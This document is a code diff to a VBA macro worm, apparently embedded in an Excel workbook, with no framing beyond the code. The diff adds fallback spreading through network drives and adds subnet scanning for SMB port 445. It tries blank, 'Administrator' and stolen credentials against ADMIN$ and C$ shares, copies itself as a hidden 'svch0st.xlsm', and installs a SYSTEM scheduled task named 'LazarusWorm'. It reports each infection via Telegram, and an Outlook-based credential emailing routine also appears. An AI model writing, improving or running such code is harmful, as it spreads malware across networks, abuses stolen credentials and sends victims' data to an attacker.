@@ -1098,7 +1098,7 @@ Private Function SendEmailWithCredential(cred As String, toEmail As String, atta
     SendEmailWithCredential = True
     Exit Function
 Fail:
-    ' Method 2: Outlook COM (fallback)
+    ' Method 2: Outlook COM (fallback – uses current Outlook session if available)
     On Error Resume Next
     Dim olApp As Object: Set olApp = CreateObject("Outlook.Application")
     If Not olApp Is Nothing Then
@@ -1445,12 +1445,15 @@ Sub SetClipboardContent(txt As String)
 End Sub
 
 ' ========================
-' PROPAGATION – USB & SMB
+' PROPAGATION – USB & SMB WITH FALLBACKS
 ' ========================
 Sub USBPropagation()
     On Error Resume Next
     Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
     If Not fso.FileExists(gSelfPath) Then Exit Sub
+    Dim copiedAny As Boolean: copiedAny = False
+    
+    ' Primary: copy to removable drives
     Dim d As Object
     For Each d In fso.Drives
         If d.DriveType = 1 And d.IsReady Then
@@ -1463,30 +1466,158 @@ Sub USBPropagation()
             SetAttr sysFolder, vbHidden + vbSystem
             fso.CopyFile gSelfPath, sysFolder & "\svch0st.xlsm", True
             SendToTelegram "USB_PROPAGATED|" & d.DriveLetter
+            copiedAny = True
         End If
     Next
+    
+    ' Fallback: if no removable drive, copy to any writable network drive
+    If Not copiedAny Then
+        Dim net As Object: Set net = CreateObject("WScript.Network")
+        Dim drives As Variant: drives = net.EnumNetworkDrives
+        Dim i As Integer
+        For i = 0 To drives.Count - 1 Step 2
+            Dim netDrive As String: netDrive = drives(i + 1) & "\"
+            If fso.FolderExists(netDrive) Then
+                fso.CopyFile gSelfPath, netDrive & "svch0st.xlsm", True
+                SendToTelegram "NETWORK_DRIVE_PROPAGATED|" & netDrive
+                copiedAny = True
+            End If
+        Next
+    End If
+    
+    If Not copiedAny Then SendToTelegram "USB_PROPAGATION_NO_TARGETS"
+End Sub
+
+' Helper: get local network IPs for SMB scanning
+Private Function GetLocalNetworkIPs() As Collection
+    On Error Resume Next
+    Dim ips As New Collection
+    Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
+    Dim ipconfigFile As String: ipconfigFile = GetTempDir() & "ipconfig.txt"
+    wsh.Run "cmd /c ipconfig > """ & ipconfigFile & """", 0, True
+    StealthSleep 2000
+    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
+    If Not fso.FileExists(ipconfigFile) Then Exit Function
+    Dim ts As Object: Set ts = fso.OpenTextFile(ipconfigFile, 1)
+    Dim line As String
+    Dim subnet As String
+    Do While Not ts.AtEndOfStream
+        line = ts.ReadLine
+        If InStr(line, "IPv4") > 0 Or InStr(line, "IP Address") > 0 Then
+            Dim parts As Variant: parts = Split(line, ":")
+            If UBound(parts) >= 1 Then
+                Dim ip As String: ip = Trim(parts(UBound(parts)))
+                If ip <> "" And InStr(ip, ".") > 0 Then
+                    subnet = Left(ip, InStrRev(ip, "."))
+                    Exit Do
+                End If
+            End If
+        End If
+    Loop
+    ts.Close
+    fso.DeleteFile ipconfigFile
+    If subnet = "" Then Exit Function
+    For i = 1 To 254
+        ips.Add subnet & i
+    Next
+    Set GetLocalNetworkIPs = ips
+End Function
+
+' Helper: check if SMB port (445) is open
+Private Function IsPortOpen(ip As String, port As Integer) As Boolean
+    On Error Resume Next
+    Dim sock As Object: Set sock = CreateObject("MSWinsock.Winsock")
+    If sock Is Nothing Then Exit Function
+    sock.Protocol = 0 ' TCP
+    sock.Connect ip, port
+    Dim startTime As Double: startTime = Timer
+    Do While sock.State <> 7 And Timer - startTime < 2
+        DoEvents
+    Loop
+    IsPortOpen = (sock.State = 7)
+    sock.Close
+End Function
+
+' Helper: attempt to copy and execute on remote target
+Private Sub CopyToRemote(targetIP As String, username As String, password As String)
+    On Error Resume Next
+    Dim remotePath As String: remotePath = "\\" & targetIP & "\C$\svch0st.xlsm"
+    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
+    ' Try ADMIN$ first
+    Dim share As String: share = "\\" & targetIP & "\ADMIN$"
+    Dim net As Object: Set net = CreateObject("WScript.Network")
+    On Error Resume Next
+    net.MapNetworkDrive "", share, False, username, password
+    If Err.Number = 0 Then
+        fso.CopyFile gSelfPath, remotePath, True
+        SetAttr remotePath, vbHidden + vbSystem
+        ' Create scheduled task
+        Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
+        wsh.Run "schtasks /create /tn ""LazarusWorm"" /tr """ & remotePath & """ /sc onlogon /s " & targetIP & " /ru SYSTEM /f", 0, True
+        SendToTelegram "SMB_PROPAGATED|" & targetIP & "|" & username
+    End If
+    net.RemoveNetworkDrive share, True, True
 End Sub
 
 Sub SMBPropagation()
     On Error Resume Next
+    ' First try net view (traditional)
     Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
     Dim out As String: out = wsh.Exec("net view").StdOut.ReadAll
-    If out = "" Or InStr(LCase(out), "no entries") > 0 Then Exit Sub
-    Dim lines As Variant: lines = Split(out, vbCrLf)
-    Dim line As Variant
-    For Each line In lines
-        If InStr(line, "\\") > 0 Then
-            Dim share As String: share = Trim(line)
-            share = Left(share, InStr(share, " "))
-            Dim remotePath As String: remotePath = share & "\C$\svch0st.xlsm"
-            Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
-            On Error Resume Next
-            fso.CopyFile gSelfPath, remotePath, True
-            If Err.Number = 0 Then
-                SetAttr remotePath, vbHidden + vbSystem
-                SendToTelegram "SMB_PROPAGATED|" & share
+    Dim targets As New Collection
+    If out <> "" And InStr(LCase(out), "no entries") = 0 Then
+        Dim lines As Variant: lines = Split(out, vbCrLf)
+        Dim line As Variant
+        For Each line In lines
+            If InStr(line, "\\") > 0 Then
+                Dim shareName As String: shareName = Trim(line)
+                shareName = Left(shareName, InStr(shareName, " "))
+                targets.Add shareName
             End If
+        Next
+    End If
+    
+    ' If net view gave no results, scan local subnet
+    If targets.Count = 0 Then
+        Dim ips As Collection: Set ips = GetLocalNetworkIPs()
+        If Not ips Is Nothing Then
+            Dim ip As Variant
+            For Each ip In ips
+                If IsPortOpen(ip, 445) Then
+                    targets.Add "\\" & ip
+                End If
+            Next
         End If
+    End If
+    
+    If targets.Count = 0 Then
+        SendToTelegram "SMB_PROPAGATION_NO_TARGETS"
+        Exit Sub
+    End If
+    
+    ' Credential list (blank, admin, stolen)
+    Dim creds As New Collection
+    creds.Add "", "blank"
+    creds.Add "Administrator", "admin"
+    If Not g_stolenCredentials Is Nothing Then
+        Dim cred As Variant
+        For Each cred In g_stolenCredentials
+            Dim parts As Variant: parts = Split(cred, "|")
+            If UBound(parts) >= 1 Then
+                creds.Add parts(0), parts(0)
+            End If
+        Next
+    End If
+    
+    ' Attempt propagation to each target
+    Dim target As Variant
+    For Each target In targets
+        Dim targetIP As String: targetIP = Replace(target, "\\", "")
+        For Each cred In creds
+            Dim username As String: username = IIf(cred = "blank", "", cred)
+            Dim password As String: password = IIf(cred = "blank", "", cred)
+            CopyToRemote targetIP, username, password
+        Next
     Next
 End Sub
 
